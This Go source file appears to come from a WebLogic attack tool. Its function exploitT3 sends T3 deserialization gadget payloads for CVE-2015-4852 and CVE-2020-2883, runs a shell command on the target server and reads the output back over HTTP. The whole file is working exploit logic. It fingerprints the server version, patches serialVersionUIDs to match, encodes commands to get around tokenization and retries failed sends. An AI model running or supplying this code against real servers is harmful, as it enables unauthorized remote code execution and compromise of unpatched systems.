package weblogic

import (
	"fmt"
	"time"
)

// exploitT3 sends a pre-compiled T3 deserialization gadget (CVE-2015-4852 /
// CVE-2020-2883) and reads the command output back over HTTP.
func exploitT3(o ExploitOptions, kind string) (string, error) {
	marker := fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	// The CVE-2020-2883 template execs Runtime.exec({"/bin/sh","-c",cmd}),
	// so cmd may contain whitespace and newlines. The CC1/StreamMessageImpl
	// templates use Runtime.exec(String), which tokenizes on whitespace and
	// therefore needs the base64-encoded no-space form.
	script := buildScriptNoSpace(marker)
	if kind == "CVE_2020_2883" {
		script = buildScript("true", marker)
	}
	payload, err := BuildT3CmdPayload(kind, script)
	if err != nil {
		return "", err
	}
	// Coherence class serialVersionUIDs differ between 12.2.1.3 and later
	// releases; patch the stream with the banner version before sending.
	version := ""
	client := NewT3Client(o.Host, o.Port, o.Timeout)
	if err := client.Connect(); err == nil {
		version = client.Version
	}
	client.Close()
	payload = patchCoherenceSUID(payload, version)
	// The T3 handshake sporadically fails when the version-probe connection
	// above races the payload connection; retry a few times before giving up.
	var sendErr error
	for attempt := 0; attempt < 3; attempt++ {
		if sendErr = SendT3Payload(o.Host, o.Port, o.Timeout, payload); sendErr == nil {
			break
		}
		time.Sleep(time.Second)
	}
	if sendErr != nil {
		return "", fmt.Errorf("T3 exploit (%s): %w", version, sendErr)
	}
	return readBack(baseOf(o), marker, o.Timeout+8*time.Second)
}
